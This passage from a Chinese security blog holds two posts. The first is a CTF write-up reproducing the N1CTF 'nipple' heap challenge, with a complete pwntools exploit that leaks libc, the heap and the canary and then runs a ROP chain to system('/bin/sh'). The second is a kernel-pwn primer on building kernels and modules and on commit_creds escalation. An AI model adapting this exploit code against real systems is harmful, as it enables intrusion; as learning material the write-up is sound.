    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="No_t1me's blog">
      <meta itemprop="description" content="逝者如斯夫，不舍昼夜">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | No_t1me's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/11/03/N1ctf%E4%B8%ADnipple%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">N1ctf中nipple题目复现</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-11-03 14:42:17" itemprop="dateCreated datePublished" datetime="2025-11-03T14:42:17+08:00">2025-11-03</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-11-05 07:58:28" itemprop="dateModified" datetime="2025-11-05T07:58:28+08:00">2025-11-05</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>跟着共享文档中师傅写的wp复现了一遍nipple（这是整个比赛中我唯一有能力复现的题目</p>
<p>题目乍看是一道比较经典的菜单题<img src="/2025/11/03/N1ctf%E4%B8%ADnipple%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1.png" alt="截屏2025-11-03 14.45.50"></p>
<p>然而初步逆向时却发现还是挺复杂的，特别是一些输出以及读入逻辑：简单来说对于某些特定的内容程序会用一个自定义函数存入动态内存中，然而对于读取也进行了一系列的操作：就对于我数据的存取而言，<strong>他会申请（原始大小*2+2）字节的chunk并将原始data中每个字节的低4位作为单独一字节的低4位同时保留原先动态内存中该字节高4位的值，高4位作为下一个字节的第四位的值保留原先高四位</strong></p>
<p>这里举一个例子：</p>
<p><img src="/2025/11/03/N1ctf%E4%B8%ADnipple%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/2.png" alt="截屏2025-11-03 14.55.52"></p>
<p>经过函数加工存储为:</p>
<p><img src="/2025/11/03/N1ctf%E4%B8%ADnipple%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/3.png"></p>
<p>堆块中存储信息也是这个形式，特别注意在4.Repack功能中，对于堆块的修改也是遵循上述的规定进行写入。</p>
<blockquote>
<p>这个读写逻辑的静态逆向比较难，个人感觉在要做题中需要多进行动态调试，通过动调并选择正确的关注点往往能够更快的弄懂程序的逻辑</p>
</blockquote>
<p>程序中还有许多第一次接触到的新知识：<img src="/2025/11/03/N1ctf%E4%B8%ADnipple%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/4.png">这里在菜单循环前new了一个0x1000大小的堆块，并将栈变量指向它。这是一个<strong>预分配的内存池</strong>，栈上存在0x10的变量分别存其基址以及游标(代表内存池的使用情况)。其实内存池与我之前接触的大部分堆题中的bss段存堆信息的作用是一样的。将这些信息存在动态内存中更加灵活，实现可拓展性。当然，如果我们能够通过构造堆overlapping或者堆溢出能控制这个内存池中的数据那么就达成了任意地址读写了。这里的内存池存在extend函数，总体逻辑就是如果游标以及到堆块的尾部的话就申请2倍自己大小复制原先内容然后free掉自己。这也一定程度上允许我们控制对应堆块的相对位置(本题没有用到)。</p>
<p>关注new功能：发现首先new的chunk没有正确初始化堆块数据便利用parse函数到新chunk中，从而造成libc与heap泄露。</p>
<p>再关注repack功能，发现读取长度可以自己选定一个不大于于chunk的size的值进行读入，这样输入大size加少数据，就能把栈中数据带出来。同时因为将数据parse进堆时同样逻辑，会造成堆溢出，通过repack在内存池地址旁的chunk溢出修改堆指针就能实现泄露cannary。getline可以实现栈溢出，修复指针(函数结尾会根据其free资源)打ROP即可。</p>
<blockquote>
<p>由于读入getline存在\x00截断所以无法直接泄露存储在chunk中的堆数据，一开始通过堆溢出想去覆盖对应chunk的0x18位置，但是因为getline输入仍然存在\x00截断，有点蠢。。。。</p>
<p>同时对于修改指针存在各种限制:首先写入的数据覆盖只能覆盖每个字节的低4位，因此直接覆盖到存在cannry_chunk+0x19的位置行不通(高4位不同)，通过该低4位为1刚好能够错开cnnary中\x00字节让它分散到两个字节中，也就没有\x00了能够正常带出来cannary。<img src="/2025/11/03/N1ctf%E4%B8%ADnipple%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/5.png">输出逻辑的判断是对于每两字节判断是否同时为0作为输出结束标识。<img src="/2025/11/03/N1ctf%E4%B8%ADnipple%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/6.png"></p>
</blockquote>
<p>poc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gdb&#x27;</span>,<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;16296&#x27;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./attachment&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">i, prompt=<span class="string">b&#x27;Choice: &#x27;</span></span>):</span><br><span class="line">    p.sendlineafter(prompt, <span class="built_in">str</span>(i).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length</span>):</span><br><span class="line">    cmd(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Length (bytes, 0..0xf000): &quot;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,length,content</span>):</span><br><span class="line">    cmd(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Length (bytes, 0..0xf000): &quot;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line">    p.sendafter(<span class="string">&quot;Data: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">staylower</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> data == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>  <span class="comment"># 或者返回 b&#x27;\x00&#x27; 如果你需要处理0</span></span><br><span class="line">    </span><br><span class="line">    ret = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    iterator = []</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 提取低4位</span></span><br><span class="line">    temp = data</span><br><span class="line">    <span class="keyword">while</span> temp != <span class="number">0</span>:</span><br><span class="line">        iterator.append(temp &amp; <span class="number">0xf</span>)</span><br><span class="line">        temp &gt;&gt;= <span class="number">8</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 组合字节</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(iterator) // <span class="number">2</span>):</span><br><span class="line">        a = iterator[<span class="number">2</span> * i]</span><br><span class="line">        b = iterator[<span class="number">2</span> * i + <span class="number">1</span>]</span><br><span class="line">        result = (a &lt;&lt; <span class="number">4</span>) + b</span><br><span class="line">        ret += <span class="built_in">bytes</span>([result])  </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">add(<span class="number">0x3b</span>) <span class="comment">#改堆块存cannary</span></span><br><span class="line"><span class="comment">#泄露libc与heap地址</span></span><br><span class="line">add(<span class="number">0xf000</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add(<span class="number">0xf000</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">leak_libc=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc.address=leak_libc-<span class="number">0x203b20</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(libc.address))</span><br><span class="line">pop_rdi=libc.address+<span class="number">0x10f75b</span></span><br><span class="line">ret=libc.address+<span class="number">0x2a875</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">add(<span class="number">0x23</span>)<span class="comment">#改堆块在内存池之前，用来溢出覆盖堆块指针</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">leak_heap=u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">target=(leak_heap&lt;&lt;<span class="number">12</span>)+<span class="number">0x601</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(target))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak cnnary</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>)+<span class="string">b&#x27;\n\n&#x27;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment">#改指针➕泄露</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x3c</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x24</span>)+staylower(<span class="number">0x1011</span>)+<span class="string">b&#x27;\x00\x00\x00&#x27;</span>+staylower(target)+<span class="string">b&#x27;\n\n&#x27;</span>)</span><br><span class="line">debug()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recv(<span class="number">0x17</span>)</span><br><span class="line">out_put=p.recv(<span class="number">9</span>).<span class="built_in">hex</span>().lstrip(<span class="string">&#x27;0x&#x27;</span>)[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">cannary=u64(<span class="built_in">bytes</span>.fromhex(out_put))</span><br><span class="line">log.success(out_put)</span><br><span class="line">log.success(<span class="built_in">hex</span>(cannary))</span><br><span class="line"><span class="comment">#修复指针</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x3c</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x24</span>)+staylower(<span class="number">0x1011</span>)+<span class="string">b&#x27;\x00\x00\x00&#x27;</span>+staylower(target-<span class="number">1</span>)+<span class="string">b&#x27;\n\n&#x27;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment">#栈溢出ROP</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x78</span>,cyclic(<span class="number">0x18</span>)+p64(cannary)+cyclic(<span class="number">0x38</span>)+p64(pop_rdi)+p64(<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>)))+p64(ret)+p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])+<span class="string">b&#x27;\n\n&#x27;</span>)</span><br><span class="line"><span class="comment">#触发ret</span></span><br><span class="line">cmd(<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="总结收获"><a href="#总结收获" class="headerlink" title="总结收获"></a>总结收获</h2><p>总的来说题目的利用手法并不是很难，堆溢出泄露数据➕栈溢出。但是题目的逆向量相对较大，对于堆的开辟以及释放过程比较绕，数据写入读取逻辑需要细心逆向。对于ida一打开感觉很难从头逆到尾的程序可以先gdb动态调试一下，关注堆块以及数据的变化再结合静态逆向食用效果更佳！</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/03/linux%E5%86%85%E6%A0%B8%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="no_t1me">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="No_t1me's blog">
      <meta itemprop="description" content="逝者如斯夫，不舍昼夜">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | No_t1me's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/11/03/linux%E5%86%85%E6%A0%B8%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="post-title-link" itemprop="url">linux内核初探及环境搭建</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-11-03 01:36:58" itemprop="dateCreated datePublished" datetime="2025-11-03T01:36:58+08:00">2025-11-03</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-11-10 15:53:36" itemprop="dateModified" datetime="2025-11-10T15:53:36+08:00">2025-11-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>开始步入linux内核的学习。打算实践为主导，先自己搭一个内核调试的环境，并在过程中学习遇到的相关知识</p>
<h2 id="内核态与用户态的分割"><a href="#内核态与用户态的分割" class="headerlink" title="内核态与用户态的分割"></a>内核态与用户态的分割</h2><ul>
<li>安全性的考虑：用户态中恶意程序无法执行特权指令，破坏系统。其中内核态空间用户态应用无权访问。</li>
<li>稳定性的保障：用户态中程序发生错误并不会导致内核的运作发生错误而影响整个系统的稳定性</li>
<li>抽象化硬件调度操作：内核为用户态实现<strong>统一的设备访问接口</strong>（系统调用），用户程序无需关注不同设备的交互细节</li>
</ul>
<p>在用户态程序中，通常利用read等系统调用后就能实现对应的写内存等操作，其中的实现细节便是在内核态中完成的。</p>
<h2 id="编译运行一个linux内核"><a href="#编译运行一个linux内核" class="headerlink" title="编译运行一个linux内核"></a>编译运行一个linux内核</h2><p>网上很多相关的步骤，算是步入内核大门的第一步。这里详细记录一下本人通过这个实践的收获：</p>
<h3 id="忽略内核模块签名验证"><a href="#忽略内核模块签名验证" class="headerlink" title="忽略内核模块签名验证"></a>忽略内核模块签名验证</h3><blockquote>
<p> <em><strong>Linux内核从3.7版本开始引入了模块签名验证机制。开启后，内核在加载模块时会使用内置的公钥对模块的签名进行校验，以确保模块的完整性和来源可信。这对于安全至关重要，但在开发和编译阶段，它可能会带来不便，因为默认情况下，内核会尝试使用自己编译过程中生成的一套密钥来签名模块。</strong></em></p>
</blockquote>
<p>因为后面会利用该内核编译一些自己写的内核模块，所以在编译之前需要禁用相应选项。</p>
<h3 id="内核镜像与磁盘镜像"><a href="#内核镜像与磁盘镜像" class="headerlink" title="内核镜像与磁盘镜像"></a>内核镜像与磁盘镜像</h3><p>在实验中我分别下载linux内核文件以及busybox分别编译，最终获得下述两个文件:<code>bzImage</code>与<code>rootfs.img</code></p>
<h4 id="bzImage"><a href="#bzImage" class="headerlink" title="bzImage"></a>bzImage</h4><ul>
<li><code>bzImage</code> 的意思是 “big zImage”，是经过压缩的Linux内核二进制文件</li>
<li>它包含了Linux内核的所有代码：进程调度、内存管理、设备驱动、文件系统支持、网络协议栈等</li>
</ul>
<h4 id="rootfs-img"><a href="#rootfs-img" class="headerlink" title="rootfs.img"></a>rootfs.img</h4><ul>
<li>一个包含了完整Linux系统<strong>目录结构</strong>和<strong>必要文件</strong>的磁盘映像。</li>
<li>由BusyBox等工具制作，包含了Shell、核心工具（<code>ls</code>, <code>cp</code>, <code>mkdir</code>等）、库文件、配置文件和初始化脚本</li>
</ul>
<h4 id="启动流程"><a href="#启动流程" class="headerlink" title="启动流程"></a>启动流程</h4><p>+———————————+<br>          BIOS&#x2F;UEFI                  ← 硬件启动<br>+———————————+<br>           ↓<br>+———————————+<br>         Bootloader (GRUB)            ← 加载 bzImage 到内存<br>+———————————+<br>           ↓<br>+———————————+<br>       Linux Kernel (bzImage)        ← 解压、初始化硬件、驱动<br>+———————————+<br>           ↓ (通过内核参数指定 rootfs)<br>+———————————+<br>      挂载根文件系统 (rootfs.img)      ← 从磁盘&#x2F;内存&#x2F;网络找到 rootfs<br>+———————————+<br>           ↓<br>+———————————+<br>     执行 &#x2F;init 或 &#x2F;sbin&#x2F;init       ← 第一个用户空间进程 (PID 1)<br>+———————————+<br>           ↓<br>+———————————+<br>         Shell 或系统服务             ← 完整的用户空间环境<br>+———————————+</p>
<blockquote>
<p>挂载：一开始的内核只有临时的目录结构，真正健全的目录系统rootfs.img还在磁盘上，挂载能够<strong>将存储设备上的文件系统关联到目录树的某个位置，使得内核可以通过文件路径访问存储设备的内容</strong>，内核系统能够正常启动离不开若干次成功的挂载。</p>
</blockquote>
<h2 id="编译一个简单内核模块"><a href="#编译一个简单内核模块" class="headerlink" title="编译一个简单内核模块"></a>编译一个简单内核模块</h2><p><em>Linux Kernel 采用的是宏内核架构，一切的系统服务都需要由内核来提供，虽然效率较高，但是缺乏可扩展性与可维护性，同时内核需要装载很多可能用到的服务，但这些服务最终可能未必会用到，还会占据大量内存空间，同时新服务的提供往往意味着要重新编译整个内核。</em>——&gt;，<strong>可装载内核模块</strong>（Loadable Kernel Modules）应运而生， LKMs 可以像积木一样被装载入内核 &#x2F; 从内核中卸载，大大提高了 kernel 的可拓展性与可维护性。</p>
<p>常见的 LKMs 包括：</p>
<ul>
<li>驱动程序（Device drivers）<ul>
<li>设备驱动</li>
<li>文件系统驱动</li>
<li>各种驱动…</li>
</ul>
</li>
<li>内核扩展模块 (modules)</li>
</ul>
<p>内核模块的文件后缀是.ko       </p>
<p>一般用c实现内核模块的编写，通过同目录下的Kbuild文件以及Makefile实现编译操作。便可以在系统中使用insmod载入模块，rfmod卸载模块。</p>
<p><img src="/2025/11/03/linux%E5%86%85%E6%A0%B8%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1.png"></p>
<blockquote>
<p>当在内核模块能够控制到函数的rip(程序执行流)，就能够通过某些方法实现提权一般来说躲不开两个函数：<code>commit_creds_kfunc(prepare_kernel_cred_kfunc(0))</code>这两个函数配合的效果会将当前进程变成0环，从而实现提取。同时要注意内核态要正确过渡到用户态我们才能自由利用提权成果</p>
</blockquote>
<p><em><strong>注意内核模块的逻辑运行环境是内核态，这其中有许多机制与用户态不同，这也是后续我需要学习的内容。</strong></em></p>
<h3 id="内核模块与用户交互机制"><a href="#内核模块与用户交互机制" class="headerlink" title="内核模块与用户交互机制"></a>内核模块与用户交互机制</h3><p>用户与内核模块程序交互相对于用户态程序较为麻烦，存在多种方式：</p>
<ul>
<li><strong>&#x2F;proc ，&#x2F;sys文件系统</strong></li>
<li><strong>ioctl 命令</strong></li>
<li><strong>netlink 套接字</strong></li>
<li>注册系统调用&#x2F;中断</li>
</ul>
<p>与破解内核模块的第一步就是搞清楚它实现的与用户交互的机制从而正确测试各项功能，这里有篇文章详细地解释并实现了各种交互方式：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/adam-ma/p/18084237">https://www.cnblogs.com/adam-ma/p/18084237</a></p>
<h4 id="file-operations结构体"><a href="#file-operations结构体" class="headerlink" title="file_operations结构体"></a>file_operations结构体</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">my_device_fops</span> =</span> &#123;</span><br><span class="line">    .owner = THIS_MODULE,							<span class="comment">//指向拥有者</span></span><br><span class="line">    .open = my_device_open,							<span class="comment">//处理打开操作</span></span><br><span class="line">    .release = my_device_release,			<span class="comment">//处理close操作</span></span><br><span class="line">    .read = my_device_read,           <span class="comment">// 处理读取操作</span></span><br><span class="line">    .write = my_device_write,         <span class="comment">// 处理写入操作  </span></span><br><span class="line">    .unlocked_ioctl = my_device_ioctl,<span class="comment">// 处理控制命令</span></span><br><span class="line">    .llseek = my_device_llseek,       <span class="comment">// 处理文件定位</span></span><br><span class="line">&#125;; <span class="comment">//这里只展示了常见的操作</span></span><br></pre></td></tr></table></figure>



<h4 id="cdev-字符设备对象"><a href="#cdev-字符设备对象" class="headerlink" title="cdev - 字符设备对象"></a>cdev - 字符设备对象</h4><p>代表内核中的一个<strong>字符设备实例</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span>              <span class="comment">// 内嵌的kobject，用于设备模型</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span>             <span class="comment">// 指向拥有此设备的模块</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">ops</span>;</span> <span class="comment">// 文件操作函数集</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span>            <span class="comment">// 连接到cdev_map的链表</span></span><br><span class="line">    <span class="type">dev_t</span> dev;                        <span class="comment">// 设备号（主设备号 + 次设备号）</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count;               <span class="comment">// 设备数量（次设备号范围）</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="字符串设备init常见流程"><a href="#字符串设备init常见流程" class="headerlink" title="字符串设备init常见流程"></a>字符串设备init常见流程</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">dev_t</span> devno = MKDEV(DEVICE_MAJOR, DEVICE_MINOR);   <span class="comment">//构造设备号</span></span><br><span class="line">register_chrdev_region(devno, <span class="number">1</span>, DEVICE_NAME);   <span class="comment">//向内核“登记”设备号区间</span></span><br><span class="line">cdev_init(&amp;my_device_cdev, &amp;my_device_fops);  <span class="comment">//初始化字符设备对象，并赋予文件操作指针</span></span><br><span class="line">my_device_cdev.owner = THIS_MODULE;    <span class="comment">//指定模块所有者</span></span><br><span class="line">cdev_add(&amp;my_device_cdev, devno, <span class="number">1</span>); <span class="comment">//把字符设备正式放进内核</span></span><br><span class="line">char_class = class_create(THIS_MODULE, CLASS_NAME);  <span class="comment">//创建设备类</span></span><br><span class="line">char_device = device_create(char_class, <span class="literal">NULL</span>, devno, <span class="literal">NULL</span>, DEVICE_NAME); <span class="comment">//创建设备文件</span></span><br></pre></td></tr></table></figure>



<p>对于dev&#x2F;DEVICE_NAME文件的操作会映射成内核模块的操作</p>
<h2 id="如何pwn？"><a href="#如何pwn？" class="headerlink" title="如何pwn？"></a>如何pwn？</h2><p>一般来说题目会给一个bzImage对应编译好的内核镜像，roofts.img对应着文件系统的镜像，并给一个启动脚本，利用启动脚本能够qemu启动内核，在启动脚本中加入-g方便gdb调试。exp的形式一般是用c语言编译成elf文件，在题目给定的内核环境中与有漏洞的ko内核模块进行交互实现提权的操作。</p>
<h4 id="本地打法："><a href="#本地打法：" class="headerlink" title="本地打法："></a>本地打法：</h4><p>构造sh文件编译exp并整合到rootfs.img文件镜像中，shell脚本如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译 exploit</span></span><br><span class="line">echo &quot;[*] Compiling exploit...&quot;</span><br><span class="line">gcc exp.c -static -masm=intel -g -o exploit || &#123;</span><br><span class="line">    echo &quot;[-] Compilation failed!&quot;</span><br><span class="line">    exit 1</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打包文件系统</span></span><br><span class="line">echo &quot;[*] Creating rootfs.cpio...&quot;</span><br><span class="line">sudo bash -c &quot;find . | cpio -o --format=newc &gt; ../rootfs.cpio&quot; || &#123;</span><br><span class="line">    echo &quot;[-] Failed to create cpio archive!&quot;</span><br><span class="line">    exit 1</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">返回上级目录</span></span><br><span class="line">cd ..</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动内核</span></span><br><span class="line">echo &quot;[*] Launching kernel...&quot;</span><br><span class="line">sudo ./start.sh</span><br></pre></td></tr></table></figure>

<h4 id="远程打法："><a href="#远程打法：" class="headerlink" title="远程打法："></a>远程打法：</h4><p>将攻击程序传输到远程中并运行，这时会出现攻击可执行文件过大的问题(因为是静态编译)，比较通用的解决方法是将 exploit 进行 base64 编码后传输。python脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span 